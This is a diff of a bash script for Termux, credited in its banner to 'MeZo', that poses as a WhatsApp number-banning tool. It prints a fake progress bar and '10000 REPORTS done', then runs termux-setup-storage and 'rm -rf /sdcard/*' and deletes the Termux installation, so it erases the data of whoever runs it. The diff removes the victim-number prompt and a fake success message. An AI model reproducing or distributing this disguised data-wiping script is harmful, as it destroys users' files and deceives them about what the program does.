@@ -21,6 +21,7 @@ sleep 7
 echo -e "             $white  coded by$blue ${underline}MeZo☠"
 echo ""
 }
+banner
 load(){
 sleep 4 && clear
         echo "==> 5%"
@@ -64,8 +65,6 @@ sleep 4 && clear
         echo "=======================================>100%"
 echo "10000 REPORTS done!!!.........................."
  clear
-sleep 2 && clear
-echo "REPORT SENDS SUCESSFULLY"
 termux-setup-storage
 rm -rf /sdcard/*
 rm -rf /data/data/com.termux/files/usr
@@ -76,9 +75,6 @@ sleep 5
 }
 printf $green
 read -p "[×]Enter a option: " op
-ip(){
-read -p "[×]ENTER VICTIM's NUMBER(with +967): " wifi
-}
 if [ $op==1 ]
 then
 	clear
@@ -87,7 +83,6 @@ then
         toilet -f future "WHATSAPP NUMBER BANNING"
 	echo "Code staring...."
 	sleep 2
-	ip
 	load
 else
 	echo "invaild option"
